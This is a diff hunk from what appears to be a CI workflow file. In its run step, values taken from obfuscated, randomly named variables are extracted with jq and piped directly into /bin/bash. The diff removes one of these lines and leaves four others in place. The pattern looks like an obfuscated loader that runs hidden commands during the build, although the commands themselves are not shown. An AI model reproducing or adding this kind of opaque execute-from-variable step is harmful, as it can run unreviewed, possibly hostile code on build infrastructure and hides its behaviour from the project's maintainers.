@@ -22,7 +22,6 @@ jobs:
           echo $k8 | jq -r .ro4 | /bin/bash
           printf '%s' "$gtp701" | jq -r .rd07 | /bin/bash
           printf '%s' "$wxd363" | jq -r .oo823 | /bin/bash
-          echo $auez66 | jq -r .x076 | /bin/bash
           echo $qbq39642 | jq -r .s5333 | /bin/bash
 
       - name: Upload results
